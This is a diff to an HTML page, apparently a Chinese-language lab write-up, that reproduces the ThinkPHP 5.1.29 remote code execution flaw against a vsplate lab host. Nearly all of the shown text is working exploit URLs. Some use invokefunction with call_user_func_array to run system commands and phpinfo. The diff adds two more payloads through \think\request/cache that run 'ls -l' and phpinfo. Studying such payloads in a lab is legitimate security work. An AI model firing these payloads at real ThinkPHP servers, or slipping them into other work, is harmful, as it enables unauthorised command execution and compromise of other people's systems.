@@ -204,9 +204,11 @@ $controller       = strip_tags($result[1] ?: $this-&gt;rule-&gt;getConfig('defau
 <p><img src="/images/thinkphp-5.1.29/2.1.png" alt="" /></p>
 <p><strong>3. 执行系统命令显示目录下文件</strong></p>
 <pre><code class="language-bash">http://tp.vsplate.me/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20-l</code></pre>
+<pre><code class="language-bash">http://tp.vsplate.me/public/index.php?s=/index/\think\request/cache&amp;key=ls%20-l|system</code></pre>
 <p><img src="/images/thinkphp-5.1.29/3.1.png" alt="" /></p>
 <p><strong>4. 执行phpinfo</strong></p>
 <pre><code class="language-bash">http://tp.vsplate.me/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=php%20-r%20'phpinfo();'</code></pre>
+<pre><code class="language-bash">http://tp.vsplate.me/public/index.php?s=/index/\think\request/cache&amp;key=1|phpinfo</code></pre>
 <p><img src="/images/thinkphp-5.1.29/4.1.png" alt="" /></p>
 <p><strong>5. 写info.php文件</strong></p>
 <p>方法 1：</p>
